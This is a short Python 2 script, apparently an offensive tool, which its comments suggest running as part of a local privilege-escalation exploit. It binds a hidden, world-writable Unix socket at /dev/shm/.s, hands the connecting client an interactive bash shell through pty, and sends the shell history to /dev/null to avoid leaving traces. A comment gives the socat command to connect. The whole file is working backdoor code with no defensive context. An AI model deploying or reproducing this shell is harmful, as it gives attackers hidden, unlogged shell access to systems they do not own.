#!/usr/bin/python2
# use: run this, perhaps as part of LPE exploit or whatever.
# to connect: socat -,echo=0,raw unix:/dev/shm/.s
import os
import socket
import pty
sockfile = "/dev/shm/.s"
if os.path.exists(sockfile):
  os.remove(sockfile)
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.bind(sockfile)
os.chmod(sockfile, 0o666) # you may need to change this
s.listen(1)
(rem, addr) = s.accept()
os.dup2(rem.fileno(), 0)
os.dup2(rem.fileno(), 1)
os.dup2(rem.fileno(), 2)
os.putenv("HISTFILE","/dev/null")
pty.spawn("/bin/bash")
